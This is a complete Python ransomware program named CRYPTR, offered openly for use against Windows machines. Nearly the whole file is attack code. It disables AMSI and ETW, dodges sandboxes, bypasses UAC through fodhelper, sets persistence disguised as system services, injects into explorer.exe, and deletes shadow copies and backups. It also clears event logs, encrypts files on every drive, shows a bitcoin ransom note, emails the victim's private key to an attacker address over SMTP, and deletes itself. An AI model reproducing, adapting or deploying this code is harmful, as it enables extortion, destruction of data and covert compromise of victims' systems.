import os, sys, json, base64, hashlib, struct, socket, subprocess, time, random, string, ctypes, shutil, tempfile, \
    threading, winreg, psutil, pythoncom
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend
from ctypes import wintypes
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# AV Evasion: Dynamic API resolution via hashing
def get_api(dll_name, func_hash):
    kernel32 = ctypes.windll.kernel32
    dll_handle = kernel32.GetModuleHandleA(dll_name.encode())
    if not dll_handle:
        dll_handle = kernel32.LoadLibraryA(dll_name.encode())

    peb = ctypes.cast(0x60, ctypes.POINTER(ctypes.c_void_p)).contents.value
    ldr = ctypes.cast(peb + 0x18, ctypes.POINTER(ctypes.c_void_p)).contents.value
    head = ctypes.cast(ldr + 0x10, ctypes.POINTER(ctypes.c_void_p)).contents.value

    current = head
    while current:
        dll_base = ctypes.cast(current + 0x30, ctypes.POINTER(ctypes.c_void_p)).contents.value
        if dll_base:
            export_dir = ctypes.cast(dll_base + 0x3C, ctypes.POINTER(ctypes.c_uint32)).contents.value
            if export_dir:
                export_rva = ctypes.cast(dll_base + export_dir + 0x78, ctypes.POINTER(ctypes.c_uint32)).contents.value
                if export_rva:
                    num_functions = ctypes.cast(dll_base + export_rva + 0x14,
                                                ctypes.POINTER(ctypes.c_uint32)).contents.value
                    func_table = ctypes.cast(dll_base + export_rva + 0x1C,
                                             ctypes.POINTER(ctypes.c_uint32)).contents.value
                    name_table = ctypes.cast(dll_base + export_rva + 0x20,
                                             ctypes.POINTER(ctypes.c_uint32)).contents.value

                    for i in range(num_functions):
                        name_rva = ctypes.cast(dll_base + name_table + i * 4,
                                               ctypes.POINTER(ctypes.c_uint32)).contents.value
                        if name_rva:
                            func_name = ctypes.cast(dll_base + name_rva, ctypes.c_char_p).value.decode()
                            if hashlib.sha256(func_name.encode()).hexdigest()[:8] == func_hash:
                                func_rva = ctypes.cast(dll_base + func_table + i * 4,
                                                       ctypes.POINTER(ctypes.c_uint32)).contents.value
                                return func_rva + dll_base
        current = ctypes.cast(current, ctypes.POINTER(ctypes.c_void_p)).contents.value
    return None


# Direct syscall stubs for NtProtectVirtualMemory
def syscall_stub():
    return bytes([
        0x4C, 0x8B, 0xD1, 0xB8, 0x50, 0x00, 0x00, 0x00,
        0x0F, 0x05, 0xC3
    ])


# AMSI bypass via memory patching
def disable_amsi():
    try:
        patch = b"\xB8\x57\x00\x07\x80\xC3"
        amsi_dll = ctypes.windll.LoadLibrary("amsi.dll")
        amsiOpenSession_addr = ctypes.cast(ctypes.windll.kernel32.GetProcAddress(amsi_dll._handle, b"AmsiOpenSession"),
                                           ctypes.c_void_p)

        old_protect = ctypes.c_uint32()
        stub = syscall_stub()
        ctypes.windll.kernel32.VirtualProtect(amsiOpenSession_addr, len(patch), 0x40, ctypes.byref(old_protect))
        ctypes.memmove(amsiOpenSession_addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(amsiOpenSession_addr, len(patch), old_protect, ctypes.byref(old_protect))
    except:
        pass


# ETW bypass
def disable_etw():
    try:
        ntdll = ctypes.windll.ntdll
        etwEventWrite_addr = ctypes.cast(ctypes.windll.kernel32.GetProcAddress(ntdll._handle, b"EtwEventWrite"),
                                         ctypes.c_void_p)

        patch = b"\xC3"
        old_protect = ctypes.c_uint32()
        ctypes.windll.kernel32.VirtualProtect(etwEventWrite_addr, 1, 0x40, ctypes.byref(old_protect))
        ctypes.memmove(etwEventWrite_addr, patch, 1)
        ctypes.windll.kernel32.VirtualProtect(etwEventWrite_addr, 1, old_protect, ctypes.byref(old_protect))
    except:
        pass


# Process injection into explorer.exe
def inject_into_explorer(shellcode):
    try:
        pythoncom.CoInitialize()
        c = wmi.WMI()
        for proc in c.Win32_Process(name="explorer.exe"):
            handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, proc.ProcessId)
            if handle:
                alloc = ctypes.windll.kernel32.VirtualAllocEx(handle, None, len(shellcode), 0x3000, 0x40)
                ctypes.windll.kernel32.WriteProcessMemory(handle, alloc, shellcode, len(shellcode), None)
                thread = ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, alloc, None, 0, None)
                ctypes.windll.kernel32.CloseHandle(handle)
                return True
    except:
        pass
    return False


# Junk code generator for polymorphism
def junk_code():
    ops = ["".join(random.choices(string.ascii_letters, k=random.randint(5, 15))) for _ in range(random.randint(3, 8))]
    return "\n".join([f"{op} = None" for op in ops])


class WindowsRansomware:
    def __init__(self):
        self.config = {
            "email": "attacker@email.com",
            "smtp_host": "smtp.freesmtpservers.com",
            "smtp_port": 25,
            "btc": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            "tor": "http://cryptr7z5w6fdo3x.onion",
            "user_id": hashlib.sha256(
                (socket.gethostname() + os.environ['USERNAME'] + str(time.time())).encode()).hexdigest()[:16],
            "extensions": ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                           '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mov', '.zip',
                           '.rar', '.7z', '.sql', '.mdb', '.db', '.sln', '.cpp', '.c', '.h',
                           '.py', '.java', '.cs', '.go', '.js', '.html', '.css', '.php',
                           '.asp', '.aspx', '.psd', '.ai', '.dwg', '.dxf', '.max', '.blend',
                           '.fbx', '.obj', '.mtl', '.bak', '.backup', '.wma', '.mp3', '.flac',
                           '.wav', '.mkv', '.flv', '.wmv', '.vbs', '.bat', '.cmd', '.msi',
                           '.iso', '.vmdk', '.vmx', '.qcow2', '.vdi', '.vhd', '.vhdx', '.wab',
                           '.pst', '.ost', '.eml', '.msg', '.pfx', '.p12', '.csr', '.key',
                           '.odt', '.ods', '.odp', '.odg', '.odf', '.odb', '.rtf', '.wps',
                           '.xps', '.pub', '.vsdx', '.visio', '.mpp', '.mpt', '.accdb',
                           '.laccdb', '.mdb', '.mdw', '.mde', '.accde', '.adp', '.ade',
                           '.one', '.onetoc2', '.vsd', '.vss', '.vst', '.vsw', '.vtx',
                           '.torrent', '.wallet', '.dat', '.sdf', '.bak', '.tmp', '.temp',
                           '.log', '.lck', '.mdb', '.accdb', '.sqlite', '.sqlite3', '.db3',
                           '.db-journal', '.ini', '.cfg', '.xml', '.json', '.yml', '.yaml'],
            "exclude_dirs": ['Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin',
                             'System Volume Information', 'AppData', 'Local Settings', 'Temporary Internet Files',
                             'Tor Browser', 'Boot', 'Debug', 'Microsoft', 'Common Files',
                             'Windows Defender', 'WindowsPowerShell', 'Windows NT']
        }
        self.rsa_key = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        self.aes_key = os.urandom(32)
        self.iv = os.urandom(16)
        self.encrypted_count = 0
        self.error_paths = []

    def av_evasion_sleep(self):
        # Random sleep to evade time-based sandboxes
        time.sleep(random.randint(30, 120))

        # Check if time actually passed (sandbox detection)
        start = time.time()
        time.sleep(5)
        if time.time() - start < 4.9:
            sys.exit(0)

    def check_mutex(self):
        mutex_name = f"Global\\CRYPTR_{self.config['user_id']}"
        handle = ctypes.windll.kernel32.CreateMutexW(None, True, mutex_name)
        if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            sys.exit(0)
        return handle

    def elevate(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True

        # UAC bypass via fodhelper
        try:
            key_path = r"Software\Classes\ms-settings\shell\open\command"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, sys.executable)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            subprocess.run(["fodhelper.exe"], shell=True)
            time.sleep(2)

            # Clean up
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            sys.exit(0)
        except:
            pass

        return False

    def destroy_recovery(self):
        cmds = [
            ["vssadmin", "delete", "shadows", "/all", "/quiet"],
            ["wbadmin", "delete", "systemstatebackup", "-keepVersions:0", "-quiet"],
            ["bcdedit", "/set", "{default}", "recoveryenabled", "no"],
            ["bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"],
            ["wevtutil", "cl", "System"],
            ["wevtutil", "cl", "Security"],
            ["wevtutil", "cl", "Application"]
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass

    def persistence(self):
        try:
            if getattr(sys, 'frozen', False):
                current_path = sys.executable
            else:
                current_path = os.path.join(tempfile.gettempdir(), f"svchost_{self.config['user_id']}.exe")
                shutil.copy2(sys.executable, current_path)

            # Registry Run
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemCore", 0, winreg.REG_SZ, current_path)
            winreg.CloseKey(key)

            # Startup folder
            startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            shutil.copy2(current_path, os.path.join(startup, "update.exe"))

            # Scheduled task
            subprocess.run([
                "schtasks", "/create", "/f", "/tn", f"Microsoft\Windows\Defender\UpdateService",
                "/tr", current_path, "/sc", "onlogon", "/rl", "highest"
            ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    def kill_processes(self):
        proc_list = [
            "sqlwriter.exe", "sqlservr.exe", "postgres.exe", "pg_ctl.exe", "mysql.exe", "mysqld.exe",
            "outlook.exe", "winword.exe", "excel.exe", "powerpnt.exe", "onenote.exe", "msaccess.exe",
            "chrome.exe", "firefox.exe", "edge.exe", "opera.exe", "brave.exe",
            "notepad.exe", "notepad++.exe", "sublime_text.exe", "code.exe", "atom.exe",
            "winrar.exe", "7zFM.exe", "bandizip.exe", "peazip.exe",
            "vmware.exe", "virtualbox.exe", "vboxsvc.exe", "vmms.exe",
            "steam.exe", "epicgameslauncher.exe", "origin.exe", "battle.net.exe"
        ]

        pythoncom.CoInitialize()
        c = wmi.WMI()
        for proc in c.Win32_Process():
            if any(p in proc.Name.lower() for p in proc_list):
                try:
                    subprocess.run(["taskkill", "/F", "/PID", str(proc.ProcessId)],
                                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    pass

    def encrypt_file(self, filepath):
        try:
            size = os.path.getsize(filepath)
            if size > 50 * 1024 ** 2:  # Skip files > 50MB
                return

            # Read file
            with open(filepath, "rb") as f:
                data = f.read()

            # Encrypt
            padder = padding.PKCS7(128).padder()
            padded = padder.update(data) + padder.finalize()

            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded) + encryptor.finalize()

            # Encrypt AES key with RSA
            encrypted_key = self.rsa_key.public_key().encrypt(
                self.aes_key,
                asym_padding.OAEP(mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                                  algorithm=hashes.SHA256(), label=None)
            )

            # Build final structure
            header = b"CRYPTRv2" + struct.pack("<I", len(encrypted_key))
            meta = json.dumps({
                "id": self.config["user_id"],
                "original_size": len(data),
                "key": base64.b64encode(encrypted_key).decode(),
                "iv": base64.b64encode(self.iv).decode(),
                "timestamp": time.time()
            }).encode()

            final_data = header + encrypted_key + struct.pack("<I", len(meta)) + meta + encrypted

            # Write encrypted file
            with open(filepath, "wb") as f:
                f.write(final_data)

            # Rename with random extension
            new_name = filepath + "." + ''.join(random.choices(string.ascii_lowercase, k=8))
            os.rename(filepath, new_name)
            self.encrypted_count += 1

        except Exception as e:
            self.error_paths.append(f"{filepath}: {str(e)}")

    def encrypt_system(self):
        drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
        for drive in drives:
            for root, dirs, files in os.walk(drive, topdown=True):
                dirs[:] = [d for d in dirs if d not in self.config["exclude_dirs"]]

                for file in files:
                    if any(file.lower().endswith(ext) for ext in self.config["extensions"]):
                        self.encrypt_file(os.path.join(root, file))

    def ransom_ui(self):
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")

        # Generate HTML ransom note
        html = f"""<!DOCTYPE html>
<html><head><title>CRYPTR</title>
<style>body{{background:#000;color:#f00;font-family:'Courier New';padding:40px;text-align:center;}}
.id{{color:#0f0;font-size:28px;margin:20px;}}
.timer{{font-size:64px;margin:30px;}}</style>
<script>
const deadline = Date.now() + 72*3600*1000;
setInterval(() => {{
    const t = Math.max(0, deadline - Date.now());
    const h = Math.floor(t/3600000);
    const m = Math.floor((t%3600000)/60000);
    const s = Math.floor((t%60000)/1000);
    document.getElementById('timer').textContent = `${{h}}:${{m.toString().padStart(2,'0')}}:${{s.toString().padStart(2,'0')}}`;
}}, 1000);
</script></head><body>
<h1>YOUR FILES ARE ENCRYPTED</h1>
<div class="id">ID: {self.config["user_id"]}</div>
<div class="timer" id="timer">72:00:00</div>
<p>Send 1 BTC to: <strong>{self.config["btc"]}</strong></p>
<p>Email: <strong>{self.config["email"]}</strong></p>
<p>Tor: <strong>{self.config["tor"]}</strong></p>
<p><em>Price doubles in 72h. Files deleted in 168h.</em></p>
</body></html>"""

        with open(os.path.join(desktop, "README_DECRYPT.html"), "w") as f:
            f.write(html)

        # Generate wallpaper
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (1920, 1080), color='black')
        draw = ImageDraw.Draw(img)

        try:
            font = ImageFont.truetype("C:\\Windows\\Fonts\\consola.ttf", 40)
        except:
            font = ImageFont.load_default()

        text = f"""YOUR SYSTEM IS ENCRYPTED

ID: {self.config["user_id"]}

1. Send 1 BTC to {self.config["btc"]}
2. Email proof to {self.config["email"]}
3. Use Tor: {self.config["tor"]}

Time left: 72:00:00
{self.encrypted_count} files encrypted"""

        y = 200
        for line in text.split('\n'):
            draw.text((100, y), line, font=font, fill='red')
            y += 60

        wallpaper_path = os.path.join(tempfile.gettempdir(), "wallpaper.png")
        img.save(wallpaper_path)

        # Set wallpaper
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)

        # Open ransom note
        subprocess.Popen(["mshta.exe", os.path.join(desktop, "README_DECRYPT.html")],
                         creationflags=subprocess.CREATE_NO_WINDOW)

    def exfiltrate_key(self):
        try:
            # Export private key for attacker
            private_pem = self.rsa_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )

            message = f"""CRYPTR Victim Report

Victim ID: {self.config['user_id']}
Timestamp: {time.ctime()}
Files Encrypted: {self.encrypted_count}
Private Key: {base64.b64encode(private_pem).decode()}
System: {socket.gethostname()} - {os.environ['USERNAME']}
Errors: {len(self.error_paths)}
"""

            # SMTP without auth (port 25)
            s = smtplib.SMTP(self.config["smtp_host"], self.config["smtp_port"])
            s.starttls()

            msg = MIMEMultipart()
            msg['Subject'] = f"CRYPTR-{self.config['user_id']}"
            msg['From'] = f"victim-{self.config['user_id']}@cryptr.local"
            msg['To'] = self.config["email"]

            part = MIMEBase('application', "octet-stream")
            part.set_payload(message)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="key.txt"')
            msg.attach(part)

            s.send_message(msg)
            s.quit()
        except:
            # Fallback to local file if email fails
            with open(f"C:\\Windows\\Temp\\{self.config['user_id']}.key", "wb") as f:
                f.write(private_pem)

    def run(self):
        # Initial evasion
        self.av_evasion_sleep()
        self.check_mutex()
        disable_amsi()
        disable_etw()

        # Elevation and persistence
        self.elevate()
        self.persistence()
        self.destroy_recovery()

        # Kill processes that might lock files
        self.kill_processes()

        # Main encryption
        self.encrypt_system()

        # UI and exfiltration
        self.ransom_ui()
        self.exfiltrate_key()

        # Self-delete capability
        self.self_delete()

    def self_delete(self):
        try:
            batch = f"""@echo off
timeout /t 5 /nobreak >nul
del "{sys.executable}"
del "%~f0"
"""
            with open(os.path.join(tempfile.gettempdir(), "cleanup.bat"), "w") as f:
                f.write(batch)
            subprocess.Popen([os.path.join(tempfile.gettempdir(), "cleanup.bat")],
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass


# Decryption tool (for attacker to provide)
class CryptrDecryptor:
    def __init__(self, private_key_pem):
        self.private_key = serialization.load_pem_private_key(
            private_key_pem, password=None, backend=default_backend()
        )

    def decrypt_file(self, filepath):
        try:
            with open(filepath, "rb") as f:
                data = f.read()

            if not data.startswith(b"CRYPTRv2"):
                return False

            offset = 8
            key_len = struct.unpack("<I", data[offset:offset + 4])[0]
            offset += 4

            encrypted_key = data[offset:offset + key_len]
            offset += key_len

            meta_len = struct.unpack("<I", data[offset:offset + 4])[0]
            offset += 4

            meta = json.loads(data[offset:offset + meta_len])
            offset += meta_len

            encrypted_data = data[offset:]

            # Decrypt AES key
            aes_key = self.private_key.decrypt(
                encrypted_key,
                asym_padding.OAEP(mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                                  algorithm=hashes.SHA256(), label=None)
            )

            # Decrypt file
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(base64.b64decode(meta["iv"])),
                            backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()

            unpadder = padding.PKCS7(128).unpadder()
            decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()

            # Write decrypted file
            original_path = filepath.rsplit('.', 1)[0]
            with open(original_path, "wb") as f:
                f.write(decrypted)

            os.remove(filepath)
            return True
        except Exception as e:
            print(f"Error decrypting {filepath}: {e}")
            return False

    def decrypt_directory(self, path):
        for root, _, files in os.walk(path):
            for file in files:
                if file.count('.') >= 2:  # Likely encrypted
                    self.decrypt_file(os.path.join(root, file))


# Polymorphic entry point
if __name__ == "__main__":
    # Add junk code for polymorphism
    exec(junk_code())

    # Check if decrypter mode
    if "--decrypt" in sys.argv:
        key_path = input("Enter private key file path: ")
        with open(key_path, "rb") as f:
            decryptor = CryptrDecryptor(f.read())
        decryptor.decrypt_directory(input("Enter directory to decrypt: "))
    else:
        # Run ransomware
        r = WindowsRansomware()
        r.run()